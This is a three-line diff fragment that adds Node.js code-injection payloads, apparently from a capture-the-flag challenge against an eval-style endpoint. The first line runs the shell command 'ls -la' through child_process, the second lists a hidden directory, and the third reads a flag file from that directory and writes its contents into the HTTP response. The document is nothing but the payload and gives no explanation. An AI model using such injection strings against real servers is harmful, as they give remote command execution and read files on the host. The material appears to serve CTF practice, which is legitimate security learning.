@@ -1,0 +1,3 @@
+res.end(require('child_process').spawnSync('ls',['-la']).stdout.toString())
+res.end(require('fs').readdirSync('./S3cr3tEv0d3f0ld3r').toString())
+res.end(require('fs').readFileSync('./S3cr3tEv0d3f0ld3r/Ev0d3fl4g').toString())
